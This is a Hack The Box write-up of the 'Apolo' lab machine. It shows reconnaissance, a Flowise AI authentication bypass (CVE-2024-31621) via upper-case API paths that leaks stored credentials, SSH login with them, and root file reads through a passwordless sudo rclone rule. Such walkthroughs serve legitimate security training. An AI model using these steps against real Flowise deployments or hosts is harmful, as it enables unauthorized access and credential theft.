# Apolo - HTB Writeup

## Description

In the lawless expanse of the Frontier Cluster, Apolo serves as a beacon of security, working to safeguard the assets from bounty hunters. This write-up details how I exploited vulnerabilities to gain unauthorized access to sensitive systems in the Apolo environment.

## Setup

- **Target IP**: 10.129.244.8
- **Docker**: Spawned with the above IP.

### Recon

Using Nmap, I scanned the target IP:

```
nmap -T4 -sV -A 10.129.244.8
```

![image](https://github.com/user-attachments/assets/84b4f90f-c94c-4197-b644-9062beec7f75)

The scan revealed two open ports:
- Port 22 (SSH)
- Port 80 (HTTP)

Make sure to add `apolo.htb` to `/etc/hosts`.

Accessing `http://apolo.htb` revealed the homepage of the Apolo website, and further research revealed a hyperlink to `ai.apolo.htb` on the About page.

![image](https://github.com/user-attachments/assets/c892a871-3be9-48d6-a05d-72082e7f6d5b)


### HTTP - AI Apolo

Upon visiting `http://ai.apolo.htb`, I encountered a login page for **Flowise AI**, an open-source low-code tool used to build customized LLM orchestration flows and AI agents.

![image](https://github.com/user-attachments/assets/6aab28f9-1aa8-4f4f-8887-d732505e5df4)

Since no credentials were available, I attempted **SQL Injection (SQLi)** on the login form but was unsuccessful. My next step was to search for any CVEs related to **Flowise AI**.

## Exploiting CVE-2024-31621

I discovered an authentication bypass vulnerability in **Flowise AI version <= 1.6.5** (CVE-2024-31621), which allowed bypassing authentication by manipulating the case sensitivity of the `/api/v1/` endpoint.

For detailed information on the CVE: [Exploit-DB](https://www.exploit-db.com/exploits/52001)

### Steps to Exploit

1. **Identify vulnerable endpoint**: The code snippet from the CVE shows that URLs like `/api/v1/` are checked case-sensitively. By using uppercase (`/API/V1/`), authentication could be bypassed.

2. **Using feroxbuster**: I used **feroxbuster** to identify accessible endpoints:

   ```
   feroxbuster -u http://ai.apolo.htb/API/V1/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
   ```
   
![image](https://github.com/user-attachments/assets/4407a56a-943b-491a-8552-adf664ca5baa)

   This helped me discover several endpoints under `/API/V1/`.

3. **Accessing `/API/V1/version`**: I was able to see the version of Flowise AI which is 1.6.3, the version that is vulnerable to CVE-2024-31621

![image](https://github.com/user-attachments/assets/10909d55-c935-47c4-b319-a3a4553c7011)

4. **Accessing `/API/V1/credentials`**: I was able to access the credentials endpoint by bypassing authentication.

   ```
   http://ai.apolo.htb/API/V1/credentials
   ```

   The response returned the MongoDB credential information.

### Retrieved MongoDB Credentials

The response from the endpoint returned the following credentials:

```json
[
    {
        "id": "6cfda83a-b055-4fd8-a040-57e5f1dae2eb",
        "name": "MongoDB",
        "credentialName": "mongoDBUrlApi",
        "createdDate": "2024-11-14T09:02:56.000Z",
        "updatedDate": "2024-11-14T09:02:56.000Z"
    }
]
```

### Further Exploitation

Testing the `credentials` endpoint with the ID provided (`6cfda83a-b055-4fd8-a040-57e5f1dae2eb`), I successfully retrieved the MongoDB connection URL:

   ```
   http://ai.apolo.htb/API/V1/credentials/6cfda83a-b055-4fd8-a040-57e5f1dae2eb
   ```

```json
{
    "id": "6cfda83a-b055-4fd8-a040-57e5f1dae2eb",
    "name": "MongoDB",
    "credentialName": "mongoDBUrlApi",
    "plainDataObj": {
        "mongoDBConnectUrl": "mongodb+srv://lewis:C0mpl3xi3Ty!_W1n3@cluster0.mongodb.net/myDatabase?retryWrites=true&w=majority"
    }
}
```

The credentials were for the user **Lewis** with the password `C0mpl3xi3Ty!_W1n3`.

At this point, I mistakenly assumed the credentials were for MongoDB, but they were actually for SSH.

### SSH Access

Using the retrieved credentials, I attempted to SSH into the machine:

```bash
ssh lewis@10.129.244.14
```

![image](https://github.com/user-attachments/assets/ef8929c2-153a-491c-8e45-c933aed5a29d)

I successfully logged in, and upon checking the user's directory, I found the first flag:

```bash
cat user.txt
```

![image](https://github.com/user-attachments/assets/5dff73e3-4d1f-4579-a3b6-d8721c6bbaf4)

Flag: `HTB{llm_ex9l01t_4_RC3}`

### Privilege Escalation

I looked for **SUID** binaries and found that **Lewis** could run **`rclone`** as `sudo` without needing a password. 

```bash
lewis@apolo:~$ find / -type f -perm /4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/mount
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/at
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/su
```
To check this, I ran:

```bash
sudo -l
```

The output revealed that Lewis had permission to run `rclone` with elevated privileges without entering a password.
```bash
User lewis may run the following commands on apolo:
    (ALL : ALL) NOPASSWD: /usr/bin/rclone

```

### Exploiting `rclone` for Root Access

I used the following command to read the root flag by running `rclone` as `sudo`:

```bash
sudo rclone cat /root/root.txt
```

![image](https://github.com/user-attachments/assets/ddff1a87-0316-46b1-898b-8262b49d972c)

Flag: `HTB{cl0n3_rc3_f1l3}`

---

## Conclusion

By exploiting the authentication bypass vulnerability in **Flowise AI**, I was able to retrieve sensitive credentials and use them to gain SSH access to the target machine. Privilege escalation was achieved through misconfigured sudo permissions for the `rclone` command, ultimately allowing me to capture the root flag.

